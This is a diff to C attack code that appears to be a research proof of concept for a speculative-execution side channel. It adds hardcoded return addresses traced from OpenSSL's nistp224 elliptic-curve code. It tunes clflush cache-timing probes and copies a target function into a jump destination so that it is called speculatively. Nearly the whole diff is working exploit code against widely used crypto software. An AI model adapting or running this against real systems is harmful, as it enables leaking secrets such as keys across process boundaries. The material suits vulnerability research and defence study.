@@ -76,6 +76,40 @@ void push(uint64_t val) {
 uint64_t loaded_pages[MAX_PAGES];
 int loaded_pages_idx = 0;
 jump jump_addrs[NUM_JUMPS] = {
+        // in openssl-accept.repeats2: 254 repeats (line 14491502):
+        // part of EC_GFp_nistp224_method()
+        {0x7ffff785a74b, 0x7ffff785c256}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c261}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c277}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c28f}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c2a2}, //  retq   
+        {0x7ffff785abfc, 0x7ffff785c2b5}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c2cd}, //  retq   
+        {0x7ffff785a34a, 0x7ffff785c2e3}, //  retq   
+        {0x7ffff785a27e, 0x7ffff785c2f3}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785ac1d}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785ac28}, //  retq   
+        {0x7ffff785abfc, 0x7ffff785ac36}, //  retq   
+        {0x7ffff785ac40, 0x7ffff785c3c5}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c3d0}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c3e3}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c3f3}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c3ff}, //  retq   
+        {0x7ffff785a34a, 0x7ffff785c4b7}, //  retq   
+        {0x7ffff785a27e, 0x7ffff785c4c9}, //  retq   
+        {0x7ffff785a27e, 0x7ffff785c538}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c543}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c54e}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c55e}, //  retq   
+        {0x7ffff785a34a, 0x7ffff785c569}, //  retq   
+        {0x7ffff785a41a, 0x7ffff785c61d}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c628}, //  retq   
+        {0x7ffff785abfc, 0x7ffff785c638}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c645}, //  retq   
+        {0x7ffff785a5f0, 0x7ffff785c798}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c847}, //  retq   
+        {0x7ffff785c858, 0x7ffff785ea59}, //  retq   
+        /*
         // CAMELLIA256-SHA / EVP_MD_CTX_init...
         {0x7ffff780d32d, 0x7ffff780d3ff}, //  retq   
         {0x7ffff788a28b, 0x7ffff788a3b1}, //  retq   
@@ -108,6 +142,7 @@ jump jump_addrs[NUM_JUMPS] = {
         {0x7ffff780cc45, 0x7ffff780d437}, //  retq   
         {0x7ffff780d407, 0x7ffff789730b}, //  retq   
         {0x7ffff7897318, 0x7ffff788a420}, //  retq  
+        //*/
     };
 
 
@@ -184,6 +219,7 @@ void check_probes() {
     for (i=0; i<NUM_PROBES; i++) {
         _mm_clflush(&probe_buf[i*cur_probe_space]);
     }
+    //usleep(100);
 }
 
 uint64_t jmp_ptr;
@@ -228,9 +264,7 @@ void indirect_camellia(register uint64_t *jmp_ptr) {
 
 
 done_jumps:
-    //target_fn();
     (*fn_ptr)();
-    //check_probes();
 }
 
 
@@ -246,13 +280,15 @@ void measure() {
     uint64_t last_i = 0xff;
 
     while (1) {
-        for (i=0; i<5000; i++) {
+        for (i=0; i<15000; i++) {
             _mm_clflush(&fn_ptr);
             _mm_clflush(&jmp_ptr);
             //indirect(&jmp_ptr);
             indirect_camellia(&jmp_ptr);
             //((void(*)(void *))map)(&jmp_ptr);
-            usleep(1);
+            if ((i % 3)==0) {
+                usleep(10);
+            }
         }
         uint64_t avg = 0;
         if (cache_hits > 0) avg = tot_time/cache_hits;
@@ -265,15 +301,16 @@ void measure() {
             }
         }
 
-        if (max_res > 10 && avg < 50){
+        if ((max_res > 10 && avg < 50) || (max_res > 2 && avg < 30)){
             printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
                      max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
             avgpct += ((float)max_res)/tot_runs;
 
+            /*
             if (max_i != ((last_i + 1)&0xff)) {
-                printf("---- ERROR: ^^^^^^^^^\n");
-                exit(-1);
-            }
+                //printf("---- ERROR: ^^^^^^^^^\n");
+                //exit(-1);
+            }//*/
             last_i = max_i;
             signal_idx++;
             instr++;
@@ -297,7 +334,7 @@ void measure() {
 
         memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
         //signal_idx %= NUM_PROBES;
-        usleep(10);
+        usleep(1000);
     }
 
 
@@ -342,10 +379,14 @@ int main()
     }
 
 
+    load_page(jump_addrs[NUM_JUMPS-1].to);
+    printf("Copying 0x%x bytes to 0x%08x...\n", end_target_fn-target_fn,
+            (uint64_t)jump_addrs[NUM_JUMPS-1].to);
     // Copy the target_fn code into the last jump_addrs[NUM_JUMPS-1].to
     // This will hopefully be speculatively called...
     memcpy((void*)jump_addrs[NUM_JUMPS-1].to, target_fn, end_target_fn-target_fn);
 
+    printf("bye\n");
 
 
     /*
